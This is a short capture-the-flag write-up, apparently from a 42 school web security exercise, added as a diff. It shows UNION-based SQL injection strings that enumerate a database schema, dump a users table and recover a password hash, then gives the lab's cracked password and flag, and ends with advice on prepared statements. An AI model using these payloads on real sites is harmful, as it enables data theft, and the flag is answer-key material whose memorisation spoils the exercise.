@@ -1,0 +1,29 @@
+
+LOCATION : Members page
+
+on the members page, this SQL query allows us to list the existing SQL tables:
+
+`-1 UNION SELECT table_name, table_schema FROM information_schema.tables;`
+
+we then find a table named `users` with a` Member_Sql_Injection` schema. (like a hint from the 42 staff xD)
+    ############################################################################################################
+
+then we can list the columns of all the tables with this SQL query:
+    `-1 UNION SELECT table_name, column_name FROM information_schema.columns;`
+we then identify 8 columns: `user_id`,` first_name`, `last_name`,`town`, `country`,`planet`, `Commentaire` and `countersign`.
+    ############################################################################################################
+
+now that we have all this information we can do an SQL query to retrieve all the information we want on the table.
+    `-1 UNION SELECT 1, CONCAT (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM Member_Sql_Injection.users;`
+    ############################################################################################################
+
+We find the hash of the password `5ff9d0165b4f92b14994e5c685cdce28` and following the instructions:
+we decrypt the hash to md5 and we then find the original password `FortyTwo`.
+then convert it to LowerCase :: `fortytwo`.
+finally we encrypt in SHA256 and we get the flag. ::> `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
+    ############################################################################################################
+
+How to secure:
+-use Prepared Statements/Bound Parameters 
+    to prevent sql injections (write the SQL command and the user-provided data separately) 
+    so the input will be set into the query as value and not as part of the sql query.
